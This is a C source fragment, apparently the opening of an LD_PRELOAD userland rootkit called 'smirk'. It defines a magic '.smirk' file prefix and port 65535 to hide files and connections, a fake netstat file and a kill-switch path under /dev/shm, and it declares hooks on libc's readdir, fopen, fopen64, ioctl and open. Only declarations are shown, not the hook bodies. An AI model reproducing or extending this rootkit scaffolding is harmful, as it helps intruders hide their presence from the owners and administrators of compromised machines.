#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <linux/fs.h>
#include <stdlib.h>
#include <errno.h>
#include <regex.h>

#define DEBUG
#define KILLSWITCH "/dev/shm/.smirkkill"

#define LIBC "libc.so.6"
#define MAGIC_PREFIX ".smirk"
#define MAGIC_PORT 65535
#define FAKE_NETSTAT_FILE "/dev/shm/.smirknet-"

void *libc;
void *load_libc(char *);

struct dirent *(*hooked_readdir)(DIR *);
FILE *(*hooked_fopen)(const char *, const char *);
FILE *(*hooked_fopen64)(const char *, const char *);
int (*hooked_ioctl)(int , unsigned long , unsigned long *);
int (*hooked_open)(const char *, int, mode_t mode);